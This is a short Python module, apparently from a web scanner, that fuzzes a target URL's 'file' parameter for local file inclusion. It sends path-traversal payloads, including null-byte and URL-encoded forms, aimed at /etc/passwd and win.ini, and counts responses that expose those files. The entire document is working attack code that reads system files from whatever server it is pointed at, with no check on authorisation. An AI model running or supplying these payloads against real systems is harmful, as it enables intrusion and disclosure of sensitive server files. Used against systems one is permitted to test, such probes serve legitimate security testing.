import requests

def run(target):
    payloads = [
        "../../etc/passwd",
        "../../../../../../etc/passwd",
        "/etc/passwd%00",
        "..%2f..%2f..%2f..%2fetc%2fpasswd",
        "..\\..\\..\\..\\windows\\win.ini"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?file={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if "root:x:" in r.text or "[extensions]" in r.text:
                hits += 1
            if payload in r.text:
                reflections += 1
        except:
            continue

    return {
        "module": "fuzz_lfi",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "LFI test for /etc/passwd and win.ini"
    }
